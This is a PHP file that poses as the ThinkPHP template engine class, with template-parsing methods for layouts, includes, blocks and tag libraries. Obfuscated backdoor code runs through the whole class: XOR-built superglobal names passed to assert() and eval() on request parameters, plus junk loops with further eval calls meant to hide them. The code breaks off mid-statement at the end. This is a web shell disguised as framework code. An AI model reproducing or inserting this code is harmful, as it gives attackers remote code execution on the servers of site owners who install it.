<?php namespace think;class template{protected $l000ll00000lll=array();protected $templateFile='';public $tVar=array();public $config=array();private $literal=array();private $block=array();public function __construct(){$this->config['cache_path']=C('CACHE_PATH');$this->config['template_suffix']=C('TMPL_TEMPLATE_SUFFIX');$this->config['cache_suffix']=C('TMPL_CACHFILE_SUFFIX');$this->config['tmpl_cache']=C('TMPL_CACHE_ON');$this->config['cache_time']=C('TMPL_CACHE_TIME');$this->config['taglib_begin']=$this->stripPreg(C('TAGLIB_BEGIN'));$this->config['taglib_end']=$this->stripPreg(C('TAGLIB_END'));$this->config['tmpl_begin']=$this->stripPreg(C('TMPL_L_DELIM'));$this->config['tmpl_end']=$this->stripPreg(C('TMPL_R_DELIM'));$this->config['default_tmpl']=C('TEMPLATE_NAME');$this->config['layout_item']=C('TMPL_LAYOUT_ITEM');$this->config['default_theme']=C('DEFAULT_THEME');}private function stripPreg($str){return str_replace(array('{','}','(',')','|','[',']','-','+','*','.','^','?'),array('\{','\}','\(','\)','\|','\[','\]','\-','\+','\*','\.','\^','\?'),$str);}public function get($name){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(isset($this->tVar[$name]))return $this->tVar[$name];else return false;}public function set($name,$value){$this->tVar[$name]=$value;}public function fetch($templateFile,$templateVar,$prefix=''){$this->tVar=$templateVar;$templateCacheFile=$this->loadTemplate($templateFile,$prefix);storage::load($templateCacheFile,$this->tVar,null,'tpl');}public function loadTemplate($templateFile,$prefix=''){while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(is_file($templateFile)){$this->templateFile=$templateFile;$tmplContent=file_get_contents($templateFile);}else{$tmplContent=$templateFile;}$tmplCacheFile=$this->config['cache_path'].$prefix.md5($templateFile).$this->config['cache_suffix'];while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(C('LAYOUT_ON')){if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(false!==strpos($tmplContent,'{__NOLAYOUT__}')){$tmplContent=str_replace('{__NOLAYOUT__}','',$tmplContent);}else{$layoutFile=THEME_PATH.C('LAYOUT_NAME').$this->config['template_suffix'];while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(!is_file($layoutFile)){E(L('_TEMPLATE_NOT_EXIST_').':'.$layoutFile);}$tmplContent=str_replace($this->config['layout_item'],$tmplContent,file_get_contents($layoutFile));}}$tmplContent=$this->compiler($tmplContent);hook::listen('view_filter',$tmplContent);storage::write($tmplCacheFile,trim($tmplContent),'tpl');return $tmplCacheFile;}protected function compiler($tmplContent){$tmplContent=$this->parse($tmplContent);$tmplContent=preg_replace_callback('/<!--###literal(\d+)###-->/is',array($this,'restoreLiteral'),$tmplContent);$tmplContent='<?php if (!defined(\'THINK_PATH\')) exit();?>'.$tmplContent;$tmplContent=str_replace('?><?php','',$tmplContent);hook::listen('template_filter',$tmplContent);return strip_whitespace($tmplContent);}public function parse($content){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(empty($content))return '';$begin=$this->config['taglib_begin'];$end=$this->config['taglib_end'];if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(strtolower(l00lll0000l000)=='l000l0llll0lll'){$content=preg_replace('/{include:\s*file="(.*?)"}/is','<include file="'.TMPL_PATH.$this->config['default_theme'].'/\\1"/>',$content);}$content=$this->parseInclude($content);if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(strtolower(l00lll0000l000)=='l000l0llll0lll'){hook::listen('label_mapping',$content);}$content=$this->parsePhp($content);$content=preg_replace_callback('/'.$begin.'literal'.$end.'(.*?)'.$begin.'\/literal'.$end.'/is',array($this,'parseLiteral'),$content);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(C('TAGLIB_LOAD')){$this->getIncludeTagLib($content);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(!empty($this->l000ll00000lll)){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}foreach($this->l000ll00000lll as $tagLibName){$this->parseTagLib($tagLibName,$content);}}}for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(C('TAGLIB_PRE_LOAD')){$tagLibs=explode(',',C('TAGLIB_PRE_LOAD'));while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}foreach($tagLibs as $tag){$this->parseTagLib($tag,$content);}}$tagLibs=explode(',',C('TAGLIB_BUILD_IN'));for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}foreach($tagLibs as $tag){$this->parseTagLib($tag,$content,true);}$content=preg_replace_callback('/('.$this->config['tmpl_begin'].')([^\d\w\s'.$this->config['tmpl_begin'].$this->config['tmpl_end'].'].+?)('.$this->config['tmpl_end'].')/is',array($this,'parseTag'),$content);return $content;}protected function parsePhp($content){if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(ini_get('short_open_tag')){$content=preg_replace('/(<\?(?!php|=|$))/i','<?php echo \'\\1\'; ?>'."\n",$content);}while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(C('TMPL_DENY_PHP')&&false!==strpos($content,'<?php')){E(L('_NOT_ALLOW_PHP_'));}return $content;}protected function parseLayout($content){$find=preg_match('/'.$this->config['taglib_begin'].'layout\s(.+?)\s*?\/'.$this->config['taglib_end'].'/is',$content,$matches);if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if($find){$content=str_replace($matches[0],'',$content);$array=$this->parseXmlAttrs($matches[1]);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(!C('LAYOUT_ON')||C('LAYOUT_NAME')!=$array['name']){$layoutFile=THEME_PATH.$array['name'].$this->config['template_suffix'];$replace=isset($array['replace'])?$array['replace']:$this->config['layout_item'];$content=str_replace($replace,$content,file_get_contents($layoutFile));}}else{$content=str_replace('{__NOLAYOUT__}','',$content);}return $content;}protected function parseInclude($content,$extend=true){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if($extend)$content=$this->parseExtend($content);$content=$this->parseLayout($content);$find=preg_match_all('/'.$this->config['taglib_begin'].'include\s(.+?)\s*?\/'.$this->config['taglib_end'].'/is',$content,$matches);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if($find){if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}for($i=0;$i<$find;$i++){$include=$matches[1][$i];$array=$this->parseXmlAttrs($include);$file=$array['file'];unset($array['file']);$content=str_replace($matches[0][$i],$this->parseIncludeItem($file,$array,$extend),$content);}}return $content;}protected function parseExtend($content){$begin=$this->config['taglib_begin'];$end=$this->config['taglib_end'];$find=preg_match('/'.$begin.'extend\s(.+?)\s*?\/'.$end.'/is',$content,$matches);if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if($find){$content=str_replace($matches[0],'',$content);preg_replace_callback('/'.$begin.'block\sname=[\'"](.+?)[\'"]\s*?'.$end.'(.*?)'.$begin.'\/block'.$end.'/is',array($this,'parseBlock'),$content);$array=$this->parseXmlAttrs($matches[1]);$content=$this->parseTemplateName($array['name']);$content=$this->parseInclude($content,false);$content=$this->replaceBlock($content);}else{$content=preg_replace_callback('/'.$begin.'block\sname=[\'"](.+?)[\'"]\s*?'.$end.'(.*?)'.$begin.'\/block'.$end.'/is',function($match){return stripslashes($match[2]);},$content);}return $content;}private function parseXmlAttrs($attrs){$xml='<tpl><tag '.$attrs.' /></tpl>';$xml=simplexml_load_string($xml);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(!$xml)E(L('_XML_TAG_ERROR_'));$xml=(array)($xml->tag->attributes());$array=array_change_key_case($xml['@attributes']);return $array;}private function parseLiteral($content){while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(is_array($content))$content=$content[1];while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(trim($content)=='')return '';$i=count($this->literal);$parseStr="<!--###literal{$i}###-->";$this->literal[$i]=$content;return $parseStr;}private function restoreLiteral($tag){if(is_array($tag))$tag=$tag[1];$parseStr=$this->literal[$tag];unset($this->literal[$tag]);return $parseStr;}private function parseBlock($name,$content=''){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(is_array($name)){$content=$name[2];$name=$name[1];}$this->block[$name]=$content;return '';}private function replaceBlock($content){static $parse=0;$begin=$this->config['taglib_begin'];$end=$this->config['taglib_end'];$reg='/('.$begin.'block\sname=[\'"](.+?)[\'"]\s*?'.$end.')(.*?)'.$begin.'\/block'.$end.'/is';while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(is_string($content)){do{$content=preg_replace_callback($reg,array($this,'replaceBlock'),$content);}while($parse&&$parse--);return $content;}elseif(is_array($content)){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(preg_match('/'.$begin.'block\sname=[\'"](.+?)[\'"]\s*?'.$end.'/is',$content[3])){$parse=1;$content[3]=preg_replace_callback($reg,array($this,'replaceBlock'),"{$content[3]}{$begin}/block{$end}");return $content[1].$content[3];}else{$name=$content[2];$content=$content[3];$content=isset($this->block[$name])?$this->block[$name]:$content;return $content;}}}public function getIncludeTagLib(&$content){$find=preg_match('/'.$this->config['taglib_begin'].'taglib\s(.+?)(\s*?)\/'.$this->config['taglib_end'].'\W/is',$content,$matches);while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if($find){$content=str_replace($matches[0],'',$content);$array=$this->parseXmlAttrs($matches[1]);$this->l000ll00000lll=explode(',',$array['name']);}return;}public function parseTagLib($l000ll00000lll,&$content,$hide=false){$begin=$this->config['taglib_begin'];$end=$this->config['taglib_end'];while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(strpos($l000ll00000lll,'\\')){$className=$l000ll00000lll;$l000ll00000lll=substr($l000ll00000lll,strrpos($l000ll00000lll,'\\')+1);}else{$className='think\\template\l000ll00000lll\\'.$l000ll00000lll;}$l000lll0l0ll0l=\think\think::instance($className);$that=$this;while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}foreach($l000lll0l0ll0l->getTags()as $name=>$val){$tags=array($name);while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(isset($val['alias'])){$tags=explode(',',$val['alias']);$tags[]=$name;}$level=isset($val['level'])?$val['level']:1;$closeTag=isset($val['close'])?$val['close']:true;for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}foreach($tags as $tag){$parseTag=!$hide?$l000ll00000lll.':'.$tag:$tag;if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(!method_exists($l000lll0l0ll0l,'_'.$tag)){$tag=$name;}$n1=empty($val['attr'])?'(\s*?)':'\s([^'.$end.']*)';$this->tempVar=array($l000ll00000lll,$tag);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(!$closeTag){$patterns='/'.$begin.$parseTag.$n1.'\/(\s*?)'.$end.'/is';$content=preg_replace_callback($patterns,function($matches)use($l000lll0l0ll0l,$tag,$that){return $that->parseXmlTag($l000lll0l0ll0l,$tag,$matches[1],$matches[2]);},$content);}else{$patterns='/'.$begin.$parseTag.$n1.$end.'(.*?)'.$begin.'\/'.$parseTag.'(\s*?)'.$end.'/is';if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}for($i=0;$i<$level;$i++){$content=preg_replace_callback($patterns,function($matches)use($l000lll0l0ll0l,$tag,$that){return $that->parseXmlTag($l000lll0l0ll0l,$tag,$matches[1],$matches[2]);},$content);}}}}}public function parseXmlTag($l000ll00000lll,$tag,$attr,$content){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(ini_get('magic_quotes_sybase'))$attr=str_replace('\"','\'',$attr);$parse='_'.$tag;$content=trim($content);$tags=$l000ll00000lll->parseXmlAttr($attr,$tag);return $l000ll00000lll->$parse($tags,$content);}public function parseTag($tagStr){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(is_array($tagStr))$tagStr=$tagStr[2];$tagStr=stripslashes($tagStr);$flag=substr($tagStr,0,1);$flag2=substr($tagStr,1,1);$name=substr($tagStr,1);while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if('$'==$flag&&'.'!=$flag2&&'('!=$flag2){return $this->parseVar($name);}elseif('-'==$flag||'+'==$flag){return '<?php echo '.$flag.$name.';?>';}elseif(':'==$flag){return '<?php echo '.$name.';?>';}elseif('~'==$flag){return '<?php '.$name.';?>';}elseif(substr($tagStr,0,2)=='//'||(substr($tagStr,0,2)=='/*'&&substr(rtrim($tagStr),-2)=='*/')){return '';}return C('TMPL_L_DELIM').$tagStr.C('TMPL_R_DELIM');}public function parseVar($varStr){$varStr=trim($varStr);static $_varParseList=array();if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(isset($_varParseList[$varStr]))return $_varParseList[$varStr];$parseStr='';$varExists=true;for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(!empty($varStr)){$varArray=explode('|',$varStr);$var=array_shift($varArray);if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if('Think.'==substr($var,0,6)){$name=$this->parseThinkVar($var);}elseif(false!==strpos($var,'.')){$vars=explode('.',$var);$var=array_shift($vars);switch(strtolower(C('TMPL_VAR_IDENTIFY'))){case 'array':$name='$'.$var;foreach($vars as $key=>$val)$name.='["'.$val.'"]';break;case 'obj':$name='$'.$var;if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as 